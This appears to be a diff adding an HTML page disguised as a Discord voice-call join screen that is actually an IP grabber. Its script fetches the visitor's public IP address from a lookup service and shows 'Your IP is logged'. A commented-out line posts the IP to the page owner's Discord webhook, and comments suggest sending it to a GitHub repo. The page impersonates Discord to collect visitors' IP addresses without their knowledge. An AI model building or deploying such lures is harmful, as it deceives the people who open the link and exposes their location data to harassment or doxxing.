@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Discord Call</title>
+    <style>
+        body { background-color: #2f3136; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
+        h1 { color: #7289da; }
+    </style>
+</head>
+<body>
+    <h1>Joining Voice Channel...</h1>
+    <p>Please wait while we connect you.</p>
+    
+    <script>
+        // Get the user's IP from a free API
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ip = data.ip;
+                // Log the IP to the console (visible in browser dev tools)
+                console.log("IP Grabbed: " + ip);
+                
+                // Optional: Send to your GitHub repo as a new issue or commit
+                // For simplicity, we just alert the user
+                document.body.innerHTML = "<h1>Connected!</h1><p>Your IP is logged.</p>";
+                
+                // You can also send this IP to a Discord webhook if you have one
+                // fetch('YOUR_WEBHOOK_URL', { method: 'POST', body: JSON.stringify({content: 'IP: ' + ip}) });
+            })
+            .catch(error => console.error('Error:', error));
+    </script>
+</body>
+</html>
